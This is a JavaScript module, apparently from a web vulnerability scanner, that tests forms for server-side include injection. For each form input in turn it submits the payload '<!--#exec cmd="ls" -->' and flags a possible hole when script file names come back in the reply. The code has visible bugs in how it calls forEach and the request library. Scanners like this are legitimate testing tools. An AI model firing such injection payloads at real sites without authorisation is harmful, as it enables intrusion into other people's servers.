/*
	Diogo Leitão
	22:16 30/11/2014 
	This modules simulates a SSI (server side includes) attack.
	For simplicity purposes, this module only tests if a simple UNIX ls command
	can be executed on a form
*/
var Url = require("url");
var request = require('sync-request');
var cheerio = require("cheerio");
module.exports = {
	run: function (url) {
		var injectableForms = [];

		// Parsing the url and the queryString arguments
		var urlObject = Url.parse(url, true);

		// Get correspondent page		
		request.get(urlObject.format(), function (err,httpResponse,body) {
			var $;
			if (httpResponse.statusCode == 200) {
				// Get all forms in page via CSS selector powered by Cheerio
				$ = cheerio.load(body);
				var forms = $("form");

				// Iterate through all forms and test them individually
				forms.each(function (index, form) {
					var action = $(this).attr("action");
					var method = $(this).attr("method") || "GET";
					var inputs = $(this).children(":input");
					var actionUrlObject = Url.resolve(urlObject.format(), action);
					// Iterate through all inputs and test them individually
					var inputsArray = inputs.toArray();
					inputsArray.forEach(function (index, testingInput) {
						var testingInputName = $(inputsArray[testingInput]).attr("name");
						var SSI = '<!--#exec cmd="ls" -->';
						var form = {};
						inputsArray.forEach(function (index, input) {
							var inject = $(inputsArray[input]).attr("name") == testingInputName; 
							form[$(inputsArray[input]).attr("name")] = (inject ? SSI : ($(inputsArray[input]).val() == "" || $(inputsArray[input]).val() == undefined ? "default" : $(inputsArray[input]).val()));
						});

						if (method == "GET") {
							var actionWithQuery = actionUrlObject + "?" + require('querystring').stringify(form);
							request({
								url: actionWithQuery
							}, function (err, httpResponse, body) {
								if (body.toLowerCase().indexOf(".php".toLowerCase()) > -1) {
									if (!err) {
										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
									} else {
										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
									}
								} else if (body.toLowerCase().indexOf(".py".toLowerCase()) > -1) {
									if (!err) {
										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
									} else {
										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
									}
								} else if (body.toLowerCase().indexOf(".pl".toLowerCase()) > -1) {
									if (!err) {
										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
									} else {
										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
									}
								} else if (body.toLowerCase().indexOf(".js".toLowerCase()) > -1) {
									if (!err) {
										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
									} else {
										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
									}
								} else if (body.toLowerCase().indexOf(".rb".toLowerCase()) > -1) {
									if (!err) {
										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
									} else {
										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
									}
								}
							});
						} else {
							request.post({
								url: actionUrlObject,
								form: form
							}, function (err, httpResponse, body) {
								if (body.toLowerCase().indexOf(".php".toLowerCase()) > -1) {
									if (!err) {
										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
									} else {
										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
									}
								} else if (body.toLowerCase().indexOf(".py".toLowerCase()) > -1) {
									if (!err) {
										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
									} else {
										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
									}
								} else if (body.toLowerCase().indexOf(".pl".toLowerCase()) > -1) {
									if (!err) {
										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
									} else {
										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
									}
								} else if (body.toLowerCase().indexOf(".js".toLowerCase()) > -1) {
									if (!err) {
										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
									} else {
										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
									}
								} else if (body.toLowerCase().indexOf(".rb".toLowerCase()) > -1) {
									if (!err) {
										console.log(url + " - SSI Simple 'ls' command Module: Input with name " + testingInputName + " seems to be vulnerable to SSI");
									} else {
										console.log(url + " - SSI Simple 'ls' command Module: Testing input with name " + testingInputName + " caused error " + err + " on the server");
									}
								}
							});
						}
					});
				});
			}
		});
	}
}
